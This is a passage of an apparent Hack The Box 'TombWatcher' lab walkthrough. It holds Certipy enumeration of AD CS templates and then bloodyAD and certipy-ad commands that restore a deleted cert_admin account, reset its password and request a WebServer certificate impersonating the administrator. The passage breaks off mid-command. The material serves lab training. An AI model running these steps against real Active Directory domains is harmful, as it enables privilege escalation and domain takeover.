                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  1
    Template Name                       : DirectoryEmailReplication
    Display Name                        : Directory Email Replication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Directory Service Email Replication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  2
    Template Name                       : DomainControllerAuthentication
    Display Name                        : Domain Controller Authentication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  3
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  4
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
  5
    Template Name                       : DomainController
    Display Name                        : Domain Controller
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  6
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Computers
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  7
    Template Name                       : EFSRecovery
    Display Name                        : EFS Recovery Agent
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : File Recovery
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  8
    Template Name                       : Administrator
    Display Name                        : Administrator
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Microsoft Trust List Signing
                                          Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  9
    Template Name                       : EFS
    Display Name                        : Basic EFS
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
  10
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.

```

```
bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' get writable

distinguishedName: CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: CN=john,CN=Users,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: OU=ADCS,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: DC=tombwatcher.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=tombwatcher,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.tombwatcher.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=tombwatcher,DC=htb
permission: CREATE_CHILD

```



### Exploitation

Step-by-step privilege escalation.
```
 bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' set restore "CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb"
[+] CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb

```


```
 bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' get object "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"

distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: cert_admin
DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage: 0
countryCode: 0
dSCorePropagationData: 2024-11-16 17:07:10+00:00
givenName: cert_admin
instanceType: 4
isDeleted: True
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
logonCount: 0
msDS-LastKnownRDN: cert_admin
nTSecurityDescriptor: O:S-1-5-21-1392491010-1358638721-2126982587-512G:S-1-5-21-1392491010-1358638721-2126982587-512D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-1392491010-1358638721-2126982587-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-1392491010-1358638721-2126982587-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-1392491010-1358638721-2126982587-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-1392491010-1358638721-2126982587-553)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-1392491010-1358638721-2126982587-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;0x30;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;S-1-5-11)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-11)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b2-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0xf01ff;;;S-1-5-21-1392491010-1358638721-2126982587-512)(A;;0xf01ff;;;S-1-5-32-548)(A;;RC;;;S-1-5-11)(A;;0x20094;;;S-1-5-10)(A;;0xf01ff;;;S-1-5-18)(A;CIID;0xf01ff;;;S-1-5-21-1392491010-1358638721-2126982587-1106)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-1392491010-1358638721-2126982587-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-1392491010-1358638721-2126982587-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-1392491010-1358638721-2126982587-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: cert_admin
DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectClass: top; person; organizationalPerson; user
objectGUID: 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid: S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID: 513
pwdLastSet: 2024-11-16 17:07:04.894636+00:00
sAMAccountName: cert_admin
sn: cert_admin
uSNChanged: 13197
uSNCreated: 13186
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
whenChanged: 2024-11-16 17:07:27+00:00
whenCreated: 2024-11-16 17:07:04+00:00
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/bloodhound-ce]
└─$ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' remove object "CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb"
[+] CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb has been removed
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/bloodhound-ce]
└─$ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' set restore "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
[+] CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/bloodhound-ce]
└─$ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' set password cert_admin 'Password123!'
[+] Password changed successfully!
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/bloodhound-ce]
└─$ certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.144.23 \
  -ca tombwatcher-CA-1 -template WebServer \
  -upn administrator@tombwatcher.htb \
  -application-policies "Client Authentication"
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/bloodhound-ce]
└─$ ping 10.129.144.23
PING 10.129.144.23 (10.129.144.23) 56(84) bytes of data.
64 bytes from 10.129.144.23: icmp_seq=1 ttl=127 time=43.3 ms
64 bytes from 10.129.144.23: icmp_seq=2 ttl=127 time=42.1 ms
^V64 bytes from 10.129.144.23: icmp_seq=3 ttl=127 time=43.7 ms
64 bytes from 10.129.144.23: icmp_seq=4 ttl=127 time=43.3 ms
64 bytes from 10.129.144.23: icmp_seq=5 ttl=127 time=46.1 ms
^V64 bytes from 10.129.144.23: icmp_seq=6 ttl=127 time=78.2 ms
^C
--- 10.129.144.23 ping statistics ---
6 packets transmitted, 6 received, 0% packet loss, time 5004ms
rtt min/avg/max/mdev = 42.095/49.456/78.185/12.904 ms
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/bloodhound-ce]
└─$ certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.144.23 \
